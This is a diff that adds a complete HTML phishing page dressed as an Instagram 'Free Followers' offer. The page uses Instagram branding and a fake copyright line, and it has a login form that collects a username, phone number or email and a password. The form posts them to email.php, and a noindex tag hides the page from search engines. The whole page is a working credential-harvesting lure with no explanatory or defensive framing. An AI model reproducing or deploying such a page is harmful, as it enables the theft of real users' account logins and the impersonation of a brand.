@@ -1,0 +1,111 @@
+<html lang="en">
+<head>
+    <meta name="robots" content="noindex,nofollow">
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Get Instagram Followers For Free">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            font-family: sans-serif;
+        }
+        body {
+            background: #ffffff;
+            width: 100%;
+            height: 100vh;
+        }
+        img {
+            width: 100px;
+            height: 100px;
+            margin-top: 60px;
+        }
+        input {
+            width: 85%;
+            margin: 2px;
+            height: auto;
+            border: 1px solid #999c9f;
+            border-radius: 3px;
+            font-family: sans-serif;
+            font-size: 15px;
+            padding: 10px;
+            outline: none;
+            font-weight: 400;
+        }
+        input[type="submit"] {
+            width: 92%;
+            height: auto;
+            padding: 9px;
+            margin-top: 5px;
+            font-size: 15px;
+            background: #e23764;
+            border: none;
+            border-radius: 4px;
+            outline: none;
+            font-family: sans-serif;
+            color: #ffffff;
+        }
+        input[type="submit"]:hover {
+            background: #e23765dc;
+        }
+        h2 {
+            font-family: sans-serif;
+            color: #e23664;
+            font-size: 19px;
+            padding-top: 10px;
+        }
+        .log {
+            margin-top: -14px;
+        }
+        p {
+            padding-top: 20px;
+            color: #707070;
+            font-family: sans-serif;
+        }
+    </style>
+    <title>Instagram Followers</title>
+</head>
+<body>
+    <center>
+        <img src="https://i.ibb.co/zT503KyS/logo.png">
+        <br>
+        <h2>Free Followers Instagram</h2>
+        <br><br>
+        <div class="log">
+            <form class="login-form" action="email.php" method="post" onsubmit="return checkBeforeSubmit()">
+                <div>
+                    <input type="text" name="email" placeholder="Username, Phone Number or Email" autocomplete="off" autocapitalize="off" required>
+                    <br>
+                    <input type="password" name="password" placeholder="Password" autocomplete="off" autocapitalize="off" required>
+                    <br>
+                    <input type="hidden" name="nox" id="nox" value="6621172269" />
+                    <select style="width: 92%;padding: 7px;margin-top: 4px;font-size: 14px;font-family: sans-serif; background: #ac338c;border-radius: 4px;color: #ffffff;border: none;outline: none;">
+                        <option style="border:none;background: #e03468;">25 Followers</option>
+                        <option style="border:none;background: #e03468;">50 Followers</option>
+                        <option style="border:none;background: #e03468;">100 Followers</option>
+                        <option style="border:none;background: #e03468;">200 Followers</option>
+                        <option style="border:none;background: #e03468;">400 Followers</option>
+                        <option style="border:none;background: #e03468;">800 Followers</option>
+                        <option style="border:none;background: #e03468;">1000 Followers</option>            
+                    </select>
+                    <input type="submit" name="login" value="sign up">
+                    <p>register</p>
+                    <p>copyright instagram 2025 &copy;</p>
+                </div>
+            </form>
+        </div>
+    </center>
+    <div class="copyright"></div>
+    <script type="text/javascript"> 
+        var wasSubmitted = false;     
+        function checkBeforeSubmit(){ 
+            if(!wasSubmitted) { 
+                wasSubmitted = true; 
+                return wasSubmitted; 
+            } 
+            return false; 
+        }     
+    </script>
+</body>
+</html>
